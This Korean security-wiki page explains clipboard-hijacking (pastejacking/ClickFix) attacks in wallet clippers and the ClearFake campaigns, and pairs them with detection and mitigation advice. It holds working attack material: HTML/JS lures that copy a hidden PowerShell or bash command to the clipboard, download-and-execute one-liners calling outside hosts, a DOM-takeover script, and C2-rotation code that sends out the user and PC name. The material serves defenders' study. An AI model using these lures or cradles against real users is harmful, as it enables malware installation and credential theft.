# Clipboard Hijacking (Pastejacking) 공격

{{#include ../../banners/hacktricks-training.md}}

> "직접 복사하지 않은 것은 절대 붙여넣지 마라." – 오래되었지만 여전히 유효한 조언

## 개요

Clipboard hijacking – *pastejacking*이라고도 함 – 은 사용자가 명령어를 검사하지 않고 복사하여 붙여넣는 습관을 악용합니다. 악성 웹 페이지(또는 Electron이나 Desktop 애플리케이션과 같은 JavaScript 실행이 가능한 모든 컨텍스트)는 공격자가 제어하는 텍스트를 프로그래밍 방식으로 시스템 clipboard에 삽입합니다. 피해자는 일반적으로 정교하게 작성된 social engineering 지시에 따라 **Win + R** (실행 대화 상자), **Win + X** (빠른 액세스 / PowerShell)를 누르거나 terminal을 열고 clipboard 내용을 *붙여넣도록* 유도되며, 그 결과 임의의 명령어가 즉시 실행됩니다.

**파일이 다운로드되지 않고 첨부 파일도 열리지 않기 때문에**, 이 기법은 첨부 파일, macro 또는 직접적인 명령어 실행을 모니터링하는 대부분의 e-mail 및 웹 콘텐츠 보안 제어를 우회합니다. 따라서 이 공격은 NetSupport RAT, Latrodectus loader 또는 Lumma Stealer와 같은 commodity malware family를 전달하는 phishing campaign에서 널리 사용됩니다.<sup>[[1]](#references)</sup>

## Wallet-address replacement clippers

또 다른 **clipboard hijacking** 변종은 명령어를 전혀 붙여넣지 않습니다. 대신 피해자가 **cryptocurrency wallet address**를 복사할 때까지 기다린 다음, 붙여넣기 직전에 이를 공격자가 제어하는 주소로 조용히 교체합니다. 이는 사용자가 긴 wallet 형식의 주소에서 첫 번째와 마지막 문자만 확인하는 경우가 많기 때문에 특히 효과적입니다.<sup>[[8]](#references)</sup>

일반적인 실제 공격 특성:
- **Thin loader + nested payload**: 화면에 표시되는 app/exe는 정상적인 trading 또는 "profit" tool처럼 보이지만, 실제 clipper는 bundle 더 깊은 곳에 숨겨져 있습니다(예: .NET loader가 중첩된 Rust payload를 실행).
- **Regex-driven replacement**: malware는 `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`와 같은 문자열이나 일반적인 **44-character Solana-like** 문자열까지 탐지하고 공격자의 wallet으로 다시 작성합니다.
- **Wallet rotation at scale**: 최신 Windows sample은 단일 정적 주소 대신 currency별로 **수천 개**의 replacement wallet을 포함할 수 있어, theft가 발생할 때마다 wallet reputation이 소진되는 것을 줄입니다.<sup>[[8]](#references)</sup>

### Windows clipper flow

일반적인 구현은 **`AddClipboardFormatListener`**로 등록된 hidden window입니다. clipboard가 업데이트될 때마다 malware는 일반적으로 다음을 호출합니다:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → 현재 clipboard data에 액세스합니다.
- **`GetClipboardData`** → text를 읽습니다.
- **`EmptyClipboard`** + **`SetClipboardData`** → wallet 문자열을 공격자 값으로 교체합니다.

clipper에서 자주 확인되는 최소 hunting regex:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
User-level persistence만으로도 impact를 일으키기에 충분합니다. 관찰된 패턴 중 하나는 다음과 같습니다:<sup>[[8]](#references)</sup>
- **`%APPDATA%\silke\silke.exe`**에 payload 복사
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` 아래에 **Startup-folder LNK** 생성

Detection 아이디어:
- clipboard APIs를 지속적으로 호출하면서 동시에 `%APPDATA%`와 사용자 **Startup** 폴더에 쓰기 작업을 수행하는 프로세스.
- 새로운 LNK/executable 생성 후 wallet-address clipboard rewrites가 발생하는 경우.
- 사용되지 않는 파일을 다수 포함한 archive 또는 fake-software bundle과, 중첩된 binary를 시작하는 작은 launcher.

### macOS social-engineered quarantine removal + LaunchAgent persistence

macOS에서는 일부 campaign이 **`unlocker.command`** helper를 제공하고, Gatekeeper가 앱이 손상되었거나 unidentified developer에서 제공되었다고 표시할 경우 피해자에게 마우스 오른쪽 버튼 클릭 → **Open**을 지시합니다. 이 script는 단순히 quarantine을 제거한 다음 인접한 `.app`을 실행합니다:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
이는 **Gatekeeper exploit**이 아니며, Gatekeeper의 결정이 `com.apple.quarantine` xattr에 의존한다는 점을 악용하는 **social-engineered quarantine bypass**입니다.<sup>[[8]](#references)</sup>

실행 후 clipper는 다음을 작성하여 현재 사용자로 persist할 수 있습니다.<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – `RunAtLoad` 및 `KeepAlive`가 설정된 LaunchAgent

유용한 방어 관련 세부 사항으로, 일부 samples는 약 30초마다 LaunchAgent와 wrapper를 다시 작성하는 **self-healing watchdog**을 구현합니다. 실행 중인 process를 종료하지 않고 plist를 먼저 제거하면 malware가 즉시 이를 다시 생성할 수 있습니다.<sup>[[8]](#references)</sup> 안전한 cleanup 순서:
1. 활성 clipper process를 종료합니다.
2. LaunchAgent plist를 unload/delete합니다.
3. `~/launch.sh`와 복사된 payload를 삭제합니다.

### Delivery note: fake reputation as a force multiplier

이 family에서는 malware 자체는 기술적으로 단순한 상태로 유지하면서, **distribution layer**가 핵심 역할을 수행할 수 있습니다. 실행 전에 fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views, 그리고 정상적으로 보이는 VirusTotal comments/votes를 사용하여 binary가 신뢰할 수 있는 것처럼 보이게 만듭니다.<sup>[[8]](#references)</sup>

## Forced copy buttons and hidden payloads (macOS one-liners)

일부 macOS infostealer는 installer site(예: Homebrew)를 clone하고 **“Copy” button 사용을 강제**하여 사용자가 화면에 보이는 text만 선택하지 못하게 합니다. clipboard entry에는 예상된 installer command와 함께 추가된 Base64 payload(예: `...; echo <b64> | base64 -d | sh`)가 포함되므로, 한 번의 paste로 두 단계가 모두 실행되는 동안 UI는 추가 stage를 숨깁니다.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
이전 campaign에서는 `document.execCommand('copy')`를 사용했으며, 최신 campaign에서는 비동기 **Clipboard API**(`navigator.clipboard.writeText`)를 사용합니다.<sup>[[2]](#references)</sup>

## The ClickFix / ClearFake Flow

1. 사용자가 typosquatting되었거나 compromised된 사이트(예: `docusign.sa[.]com`)에 접속합니다.
2. 삽입된 **ClearFake** JavaScript가 `unsecuredCopyToClipboard()` helper를 호출하여 Base64로 인코딩된 PowerShell one-liner를 사용자 모르게 clipboard에 저장합니다.
3. HTML instructions는 피해자에게 다음을 지시합니다: *“**Win + R**을 누르고, command를 붙여넣은 다음 Enter를 눌러 문제를 해결하세요.”*
4. `powershell.exe`가 실행되어 정상 executable과 malicious DLL이 포함된 archive를 다운로드합니다(classic DLL sideloading).
5. loader가 추가 stages를 decrypt하고 shellcode를 inject한 뒤 persistence(예: scheduled task)를 설치합니다. 최종적으로 NetSupport RAT / Latrodectus / Lumma Stealer를 실행합니다.<sup>[[1]](#references)</sup>

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (정상 Java WebStart)는 해당 디렉터리에서 `msvcp140.dll`을 검색합니다.
* 악성 DLL은 **GetProcAddress**를 사용해 API를 동적으로 resolve하고, **curl.exe**를 통해 두 개의 바이너리(`data_3.bin`, `data_4.bin`)를 다운로드한 후, `"https://google.com/"`을 rolling XOR key로 사용해 이를 복호화하고, 최종 shellcode를 inject한 다음 **client32.exe**(NetSupport RAT)의 압축을 `C:\ProgramData\SecurityCheck_v1\`에 해제합니다.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe**로 `la.txt`를 다운로드
2. **cscript.exe** 내부에서 JScript downloader 실행
3. MSI payload를 가져와 서명된 application 옆에 `libcef.dll`을 배치 → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### MSHTA를 통한 Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** 호출은 숨겨진 PowerShell 스크립트를 실행하여 `PartyContinued.exe`를 가져오고, `Boat.pst`(CAB)를 추출하며, `extrac32`와 파일 연결을 통해 `AutoIt3.exe`를 재구성한 후, 브라우저 자격 증명을 `sumeriavgv.digital`로 유출하는 `.a3x` 스크립트를 실행합니다.<sup>[[1]](#references)</sup>

## ClickFix: 클립보드 → PowerShell → JS eval → 회전하는 C2를 사용하는 Startup LNK (PureHVNC)

일부 ClickFix 캠페인은 파일 다운로드를 완전히 생략하고 피해자에게 WSH를 통해 JavaScript를 가져와 실행하고, 이를 지속성 있게 설정한 다음 매일 C2를 변경하는 one-liner를 붙여넣도록 지시합니다. 관찰된 체인의 예:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
주요 특징
- 일반적인 검사를 피하기 위해 실행 시 난독화된 URL을 역순으로 변환합니다.
- JavaScript는 Startup LNK(WScript/CScript)를 통해 자체적으로 지속성을 확보하고, 현재 날짜에 따라 C2를 선택하여 도메인을 빠르게 교체할 수 있습니다.<sup>[[3]](#references)</sup>

날짜별로 C2를 교체하는 데 사용되는 최소한의 JS 조각:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
다음 단계에서는 일반적으로 persistence를 구축하고 RAT(예: PureHVNC)를 가져오는 loader를 배포하며, 종종 hardcoded certificate에 TLS pinning을 적용하고 traffic을 chunking합니다.<sup>[[3]](#references)</sup>

이 variant에 특화된 Detection ideas
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (또는 `cscript.exe`).
- Startup artifacts: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`에 있는 LNK가 `%TEMP%`/`%APPDATA%` 아래의 JS path와 함께 WScript/CScript를 호출하는지 확인합니다.
- `.split('').reverse().join('')` 또는 `eval(a.responseText)`가 포함된 Registry/RunMRU 및 command-line telemetry.
- 긴 command line 없이 long scripts를 전달하기 위해 대량의 stdin payload를 주입하는 `powershell -NoProfile -NonInteractive -Command -`의 반복 실행.
- updater처럼 보이는 task/path(예: `\GoogleSystem\GoogleUpdater`) 아래에서 이후 `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`과 같은 LOLBins를 실행하는 Scheduled Tasks.

Threat hunting
- `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern을 사용하는 daily-rotating C2 hostnames 및 URLs.
- Clipboard write events 이후 Win+R paste가 발생하고 곧바로 `powershell.exe`가 실행되는 흐름을 correlate합니다.

Blue-teams는 clipboard, process-creation 및 registry telemetry를 결합하여 pastejacking abuse를 pinpoint할 수 있습니다:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`는 **Win + R** commands의 history를 유지하므로, 비정상적인 Base64 / obfuscated entries를 찾습니다.
* Security Event ID **4688** (Process Creation)에서 `ParentImage` == `explorer.exe`이고 `NewProcessName`이 { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } 중 하나인 경우.
* 의심스러운 4688 event 직전에 `%LocalAppData%\Microsoft\Windows\WinX\` 또는 temporary folders 아래에 file creations가 발생했음을 나타내는 Event ID **4663**.
* EDR clipboard sensors(사용 가능한 경우) – `Clipboard Write` 직후 새 PowerShell process가 생성되는지 correlate합니다.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

최근 campaigns는 가짜 CDN/browser verification pages("Just a moment…", IUAM-style)를 대량으로 생성하여, 사용자가 clipboard에서 OS-specific commands를 복사해 native consoles에 붙여넣도록 유도합니다. 이를 통해 execution이 browser sandbox 밖으로 전환되며 Windows와 macOS 모두에서 작동합니다.<sup>[[4]](#references)</sup>

builder-generated pages의 주요 특성
- `navigator.userAgent`를 통한 OS detection으로 payloads를 맞춤 설정합니다(Windows PowerShell/CMD 대 macOS Terminal). 지원되지 않는 OS에서도 illusion을 유지하기 위한 optional decoys/no-ops를 사용할 수 있습니다.
- 정상적인 UI actions(checkbox/Copy)에서 automatic clipboard-copy가 수행되지만, visible text는 clipboard content와 다를 수 있습니다.
- Mobile blocking 및 step-by-step instructions가 포함된 popover: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Optional obfuscation 및 single-file injector를 사용하여 침해된 site의 DOM을 Tailwind-styled verification UI로 덮어씁니다(새 domain registration 불필요).<sup>[[4]](#references)</sup>

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS 초기 실행의 persistence
- 터미널이 닫힌 후에도 실행이 계속되도록 `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`를 사용하여 노출되는 흔적을 줄입니다.<sup>[[4]](#references)</sup>

침해된 사이트에서 페이지를 직접 takeover
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
IUAM-style lure에 특화된 탐지 및 hunting 아이디어
- Web: Clipboard API를 verification widget에 바인딩하는 페이지; 표시된 텍스트와 clipboard payload 간 불일치; `navigator.userAgent` 분기; 의심스러운 context에서 Tailwind + single-page replace.
- Windows endpoint: 브라우저 상호작용 직후 `explorer.exe` → `powershell.exe`/`cmd.exe`; `%TEMP%`에서 실행되는 batch/MSI installer.
- macOS endpoint: 브라우저 이벤트 근처에서 Terminal/iTerm이 `bash`/`curl`/`base64 -d`를 `nohup`과 함께 spawn; Terminal을 닫은 뒤에도 살아남는 background job.
- `RunMRU` Win+R history 및 clipboard write를 이후의 console process creation과 상관 분석.

지원 기술은 다음도 참고

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake는 계속해서 WordPress 사이트를 compromise하고, external host(Cloudflare Workers, GitHub/jsDelivr)를 연쇄적으로 호출하는 loader JavaScript를 inject하며, 현재의 lure logic을 가져오기 위해 blockchain “etherhiding” 호출(예: `bsc-testnet.drpc[.]org`와 같은 Binance Smart Chain API endpoint로 보내는 POST)까지 사용합니다. 최근 overlay는 무언가를 download하도록 하는 대신, 사용자가 one-liner(T1204.004)를 copy/paste하도록 지시하는 fake CAPTCHA를 많이 사용합니다.<sup>[[6]](#references)</sup>
- Initial execution은 점점 signed script host/LOLBAS에 위임되고 있습니다. 2026년 1월의 chain은 기존의 `mshta` 사용을 내장된 `SyncAppvPublishingServer.vbs`로 대체했으며, `WScript.exe`를 통해 실행하고 alias/wildcard가 포함된 PowerShell 유사 argument를 전달하여 remote content를 가져옵니다:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs`는 서명되어 있으며 일반적으로 App-V에서 사용됩니다. 하지만 `WScript.exe` 및 특이한 인수(`gal`/`gcm` aliases, 와일드카드가 적용된 cmdlets, jsDelivr URLs)와 함께 사용되면 ClearFake를 위한 high-signal LOLBAS stage가 됩니다.<sup>[[6]](#references)</sup>
- 2026년 2월 가짜 CAPTCHA payload는 순수 PowerShell download cradles로 다시 전환되었습니다. 실제 사례 두 가지:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- 첫 번째 chain은 메모리 내 `iex(irm ...)` grabber이며, 두 번째 chain은 `WinHttp.WinHttpRequest.5.1`을 통해 단계를 진행하고 임시 `.ps1` 파일을 작성한 다음, 숨겨진 창에서 `-ep bypass`로 실행합니다.<sup>[[6]](#references)</sup>

이러한 변형에 대한 Detection/hunting 팁
- Process lineage: 브라우저 → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` 또는 clipboard 쓰기/Win+R 직후의 PowerShell cradles.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, 또는 raw IP `iex(irm ...)` patterns.
- Network: 웹 브라우징 직후 script hosts/PowerShell에서 CDN worker hosts 또는 blockchain RPC endpoints로 outbound 요청.
- File/registry: `%TEMP%` 아래에 임시 `.ps1` 생성 및 이러한 one-liner가 포함된 RunMRU entries; external URLs 또는 obfuscated alias strings와 함께 실행되는 signed-script LOLBAS (WScript/cscript/mshta)를 차단하거나 alert합니다.

## 2026년 6월 ClickFix tradecraft: paste telemetry, fake verification comments 및 LOLBin chaining

최근 Red Canary telemetry에 따르면 안정적인 indicator는 **정확히 하나의 command가 아니라**, **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval** 및 **immediate execution**의 조합입니다.<sup>[[7]](#references)</sup>

### 주목할 만한 operator patterns

- **Paste confirmation telemetry**: 일부 payload는 실제 stage 전에 `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted`를 호출할 수 있습니다. 이는 window를 짧고 조용하게 유지하면서 user interaction을 확인합니다.
- **Fake verification comments**: PowerShell one-liner는 `# Security check ✔️ I'm not a robot Verification ID: 138105`와 같은 strings를 추가할 수 있어, Run / `cmd.exe` / PowerShell history에 paste된 후에도 command가 CAPTCHA 관련으로 보이게 합니다.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))`는 command line에 static URL을 남기지 않으면서도 메모리 내 download-and-execute를 수행합니다.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q`는 flags에 unusual casing과 Unicode-like characters를 악용하여 brittle detections를 우회하면서도 `msiexec.exe`처럼 보이게 합니다.
- **Caret-escaped LOLBin chains**: `cmd.exe`는 `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`)를 사용해 keywords를 숨기고, nested shell을 minimized 상태로 시작하며, attacker content를 `.pdf`와 같은 benign extension으로 저장한 다음 `mshta`를 통해 실행할 수 있습니다.<sup>[[7]](#references)</sup>
## Mitigations

1. Browser hardening – clipboard write-access (`dom.events.asyncClipboard.clipboardItem` 등)를 비활성화하거나 user gesture를 요구합니다.
2. Security awareness – users에게 민감한 commands를 *type*하거나 먼저 text editor에 paste하도록 교육합니다.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control을 사용해 arbitrary one-liners를 차단합니다.
4. Network controls – 알려진 pastejacking 및 malware C2 domains에 대한 outbound requests를 차단합니다.

## Related Tricks

* **Discord Invite Hijacking**은 종종 사용자를 malicious server로 유인한 후 동일한 ClickFix approach를 악용합니다:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
